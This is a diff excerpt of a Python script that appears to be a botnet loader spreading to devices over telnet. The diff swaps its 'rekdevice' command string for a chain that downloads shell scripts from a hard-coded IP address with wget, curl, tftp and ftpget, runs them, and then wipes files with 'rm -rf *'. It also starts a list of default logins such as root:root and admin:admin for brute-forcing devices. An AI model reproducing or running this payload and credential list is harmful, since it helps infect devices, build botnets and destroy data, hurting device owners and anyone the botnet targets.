@@ -6,7 +6,7 @@ if len(sys.argv) < 3:
     print("Usage: python " + sys.argv[0] + " <threads> <output file>")
     sys.exit()
 
-rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/windy.x86; chmod +x windy.x86; ./windy.x86; rm -rf windy.x86"
+rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/ohshit.sh; curl -O http://103.67.244.57/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.67.244.57 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.67.244.57; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.67.244.57 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
 
 combo = [ 
     "root:root", "root:", "admin:admin", "telnet:telnet", "support:support", "user:user",
